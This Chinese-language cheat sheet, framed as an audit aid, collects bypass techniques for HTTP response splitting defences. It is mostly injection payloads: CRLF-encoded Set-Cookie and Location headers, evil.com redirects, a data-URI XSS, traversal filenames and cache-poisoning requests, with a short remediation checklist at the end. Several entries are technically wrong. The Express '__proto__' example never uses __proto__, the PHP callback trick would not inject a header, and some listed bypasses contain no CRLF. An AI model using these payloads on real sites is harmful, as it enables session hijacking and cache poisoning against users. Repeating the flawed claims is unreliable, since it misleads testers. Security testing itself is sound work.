# HTTP 响应分割绕过技巧

本文档汇总常见的 HTTP 响应分割（HTTP Response Splitting）防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. CRLF 注入绕过

### 基础 CRLF 编码绕过

**防护机制**：过滤或禁止 `\r\n` 字符

#### 1.1 双重编码绕过
```
原始被拦截：Location: http://evil.com%0d%0a
一层编码绕过：Location: http://evil.com%250d%250a
双重编码：Location: http://evil.com%25250d%25250a

# URL 解码过程
第一次解码：%25 → %
结果：http://evil.com%0d%0a（绕过一层检查）
第二次解码：%0d%0a → \r\n（最终注入）
```

#### 1.2 不同编码格式绕过
```
十六进制：\x0d\x0a
Unicode：\u000d\u000a
HTML 实体：&#13;&#10;
十进制：&#13;&#10;
八进制：\r\n → \015\012

# 混合编码绕过
Location: http://evil.com\x0d\x0aSet-Cookie: admin=true

# 字符编码转换
使用 UTF-8、UTF-16、Latin-1 等不同编码混淆 CRLF
```

#### 1.3 字节序列编码绕过
```
ISO-8859-1 (Latin-1)：
\r = 0x0D, \n = 0x0A

使用其他编码：
UTF-16BE：\x00\x0D\x00\x0A
GB2312 / GBK 中可能存在的多字节序列代表 CRLF

# 代码示例
# Python
import urllib.parse
# 编码 CRLF
encoded = urllib.parse.quote("\r\n")  # %0D%0A
double_encoded = urllib.parse.quote(encoded)  # %250D%250A

# 通过 Content-Type: text/plain; charset=utf-16 改变解码方式
```

---

## 2. Header 字段值验证绕过

### Location 头注入绕过

**防护机制**：验证 Location 值是否为有效 URL

#### 2.1 相对路径绕过
```
# 防护：检查绝对 URL
被拦截：Location: //evil.com/
绕过：Location: /path\r\nSet-Cookie: session=hijack

# 相对路径
Location: ../../evil.com
Location: ./evil.com

# 使用数据 URI
Location: data:text/html,<script>alert('xss')</script>

# 使用 JavaScript 伪协议
Location: javascript:void(0)
```

#### 2.2 URL 编码和混淆绕过
```
# 防护：检查 URL 格式，但未对编码后的值检查
被拦截：Location: http://evil.com%0d%0aSet-Cookie: admin=true
绕过方式 1：Location: http://evil.com%2f%2e%2e%2fevil.com
绕过方式 2：Location: http://evil.com#%0d%0aSet-Cookie: admin=true
绕过方式 3：Location: http://evil.com?param=%0d%0aSet-Cookie: admin=true

# URL 规范化绕过
Location: http://evil.com%2520%250d%250a
```

#### 2.3 协议相对 URL 绕过
```
Location: //evil.com/path
Location: \\evil.com\path  # Windows 风格

# 伪协议绕过
Location: file:///etc/passwd
Location: ftp://ftp.evil.com
```

---

### Set-Cookie 头注入绕过

**防护机制**：验证 Cookie 值，禁止 CRLF

#### 3.1 属性注入绕过
```
# 防护：过滤 CRLF
被拦截：Set-Cookie: session=abc%0d%0aSet-Cookie: admin=true

绕过方式 1：属性污染
Set-Cookie: session=abc; HttpOnly=malicious%0d%0aSet-Cookie: admin=true

绕过方式 2：使用分号分隔符
Set-Cookie: session=abc;domain=evil.com;path=/admin

绕过方式 3：使用特殊字符
Set-Cookie: session=abc%20%20%20; HttpOnly; Secure
```

#### 3.2 Cookie 名称污染
```
# 防护：只检查值中的 CRLF
被拦截：Set-Cookie: session=value%0d%0aheader: injected

绕过方式：通过 Cookie 名称注入
Set-Cookie: session%0d%0aLocation: http://evil.com=value

# 多个 Cookie 头
Set-Cookie: session=abc
Set-Cookie: admin=true%0d%0aX-Injected: header
```

#### 3.3 值编码绕过
```
# Base64 编码
Set-Cookie: session=base64_encoded_value_with_CRLF

# 十六进制编码
Set-Cookie: session=hex_encoded_value

# JSON 编码
Set-Cookie: session={"data": "...\r\n..."}
```

---

## 3. Content-Disposition 头注入绕过

**防护机制**：验证文件名，禁止特殊字符

#### 3.1 文件名编码绕过
```
# 防护：检查文件名中的 CRLF
被拦截：Content-Disposition: attachment; filename="file\r\nSet-Cookie: admin=true.txt"

绕过方式 1：RFC 5987 编码（字符编码）
Content-Disposition: attachment; filename*=UTF-8''file%0d%0a.txt
Content-Disposition: attachment; filename*=ISO-8859-1'en'%0D%0A.txt

绕过方式 2：双重编码
filename="file%250d%250a.txt"

绕过方式 3：使用 filename* 参数
Content-Disposition: attachment; filename="normal.txt"; filename*=UTF-8''injection%0d%0a.txt
```

#### 3.2 属性分隔绕过
```
# 防护：过滤分号或特殊字符
被拦截：filename="test\r\nX-Injection: header.txt"

绕过方式 1：使用空格或其他分隔符
Content-Disposition: attachment  filename="test.txt"

绕过方式 2：使用制表符
Content-Disposition: attachment;	filename="test.txt"

绕过方式 3：使用注释
Content-Disposition: attachment; /* comment */ filename="test.txt"
```

#### 3.3 动态生成的文件名绕过
```
# 防护：对特殊字符转义
被拦截：filename="user_input.txt"（假设已过滤）

绕过方式 1：使用 Unicode 字符
filename="user\u0000input.txt"

绕过方式 2：路径穿越
filename="../../etc/passwd.txt"

绕过方式 3：使用超长文件名
filename="a" * 10000 + "\r\n"（缓冲区溢出）
```

---

## 4. 多行响应头处理绕过

**防护机制**：规范化和验证多行响应头

#### 4.1 换行符变体绕过
```
# 标准 CRLF
Header: value\r\nInjected: header

# 仅使用 LF（\n）
Header: value\nInjected: header

# 仅使用 CR（\r）
Header: value\rInjected: header

# 混合编码
Header: value\x0a\x0d Injected: header
Header: value\u000a Injected: header
```

#### 4.2 空白符和折叠绕过
```
# 标准折叠（continuation line）
Header: value
 continued_value

# 注入伪装成折叠
Header: value
 Set-Cookie: admin=true

# 使用 Tab 符
Header: value\t\nInjected: header

# 使用多个空格
Header: value  \nInjected: header
```

#### 4.3 响应体分割绕过
```
# 标准 CRLF CRLF 分隔
HTTP/1.1 200 OK\r\n
Header: value\r\n
\r\n
Body

# 注入额外的 CRLF CRLF
HTTP/1.1 200 OK\r\n
Header: value%0d%0a%0d%0a
Injected-Body\r\n
\r\n
Original-Body

# 使用单个 LF
Header: value\n\nInjected-Body
```

---

## 5. 框架特定绕过

### PHP header() 函数绕过

**防护机制**：PHP 5.4+ 自动移除 CRLF

#### 5.1 编码绕过
```php
// 防护：header() 移除 \r\n
// 被拦截：header("Location: " . $_GET['url']);

// 绕过方式 1：使用 http_response_code 和自定义头
http_response_code(301);
header("Location: " . $_GET['url']);  // 使用特殊编码的 URL

// 绕过方式 2：使用 header_register_callback
header_register_callback(function() {
    echo "Injected-Header: value\r\n";
});

// 绕过方式 3：使用输出缓冲
ob_start();
header("Location: " . base64_decode($_GET['url']));
ob_end_clean();

// 绕过方式 4：利用响应分割的 PHP 旧版本
```

### Node.js Express 绕过

**防护机制**：自动验证响应头值

#### 5.2 对象污染
```javascript
// 防护：res.set() 验证头值
// 被拦截：res.set('Location', req.query.url);

// 绕过方式 1：使用原型污染
Object.prototype.constructor.prototype.test = 'injected';
res.set('Custom-Header', req.query.value);

// 绕过方式 2：使用 __proto__
const obj = {};
obj['Location\r\nSet-Cookie'] = 'admin=true';
res.set(obj);

// 绕过方式 3：使用 writeHead
res.writeHead(200, {
  'Location': req.query.url,
  'Set-Cookie': 'session=' + req.query.session
});
```

### Python Flask/Django 绕过

**防护机制**：响应对象验证

#### 5.3 响应对象绕过
```python
# 防护：response.headers 验证
# 被拦截：response.headers['Location'] = request.args.get('url')

# 绕过方式 1：使用 werkzeug 底层 API
from werkzeug.datastructures import Headers
headers = Headers()
headers['Location'] = 'http://evil.com\r\nSet-Cookie: admin=true'
response.headers.extend(headers)

# 绕过方式 2：使用原始响应对象
from flask import Response
resp = Response()
resp.headers['Location'] = request.args.get('url')
# 通过 WSGI 应用访问原始环境

# 绕过方式 3：使用自定义中间件
```

---

## 6. 缓存投毒相关绕过

**防护机制**：缓存键验证和响应头规范化

#### 6.1 缓存键污染
```
# 正常请求
GET /api/user HTTP/1.1
Host: example.com

# 注入请求
GET /api/user HTTP/1.1
Host: example.com
X-Original-URL: /api/user%0d%0aSet-Cookie: admin=true

# 缓存键：/api/user（相同）
# 但响应头被污染：Set-Cookie: admin=true 被缓存并返回给其他用户
```

#### 6.2 Host 头污染
```
# 防护：验证 Host 头
被拦截：Host: example.com\r\nSet-Cookie: admin=true

绕过方式：
Host: example.com:80\r\nSet-Cookie: admin=true
Host: example.com%20\r\nSet-Cookie: admin=true
Host: example.com.evil.com
```

---

## 7. WAF 绕过技巧

### 多重编码组合
```
原始：\r\n
一层：%0d%0a（URL 编码）
二层：%250d%250a（二重编码）
三层：%25250d%25250a（三重编码）

# 混合编码
%0d%0aSet-Cookie: admin=true
\r\nSet-Cookie: admin=true
&#13;&#10;Set-Cookie: admin=true
\x0d\x0aSet-Cookie: admin=true
```

### 大小写混合
```
Location: hTTp://evil.com
Location: HTTP://evil.com
Content-Disposition: attachment; FILENAME="test.txt"
```

### 字符替换和拼接
```
# 拆分关键字
Location: {url}
Set-Cookie: ad{min}=true

# 使用变量和动态生成
Location: ${baseUrl}/path
Set-Cookie: session=${generateId()}
```

---

## 8. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 简单字符黑名单 | 低 | 编码、大小写混合、字符替换 |
| CRLF 过滤 | 低 | 双重编码、不同编码格式、字节序列 |
| URL 验证 | 低-中 | 相对路径、数据 URI、协议相对 URL |
| 框架自动检查 | 中 | 原型污染、WSGI 环境访问、原始 API 调用 |
| 多层验证 | 中-高 | 绕过第一层后利用第二层漏洞、缓存不一致 |
| WAF 规则 | 中-高 | 多重编码、混合字符集、规则绕过 |

---

## 9. 审计建议

### 高风险指标
- 响应头值直接由用户输入构造
- 防护基于黑名单过滤而非白名单验证
- 框架版本过旧，存在已知绕过方式
- 多个防护层之间存在不一致或冲突

### 审计步骤
1. **定位响应头构造点**：在代码中查找 header()、setHeader()、set() 等函数调用
2. **追踪用户输入**：确认哪些参数受用户控制（GET/POST/Cookie/Headers）
3. **验证防护机制**：评估是否存在 CRLF 过滤、格式验证等防护
4. **尝试绕过**：使用本文档中的技巧进行测试和验证
5. **检查缓存行为**：验证是否存在缓存投毒风险
6. **生成报告**：记录所有发现的漏洞及其危害

### 验证修复
修复 HTTP 响应分割漏洞时，确保：
- 使用框架提供的安全 API 构造响应头
- 对所有用户输入进行严格的白名单验证
- 禁止在响应头值中使用任何 CRLF 字符（\r、\n）
- 使用最新版本的框架和库
- 定期进行安全审计和渗透测试
- 在 WAF 和反向代理层面增加额外防护
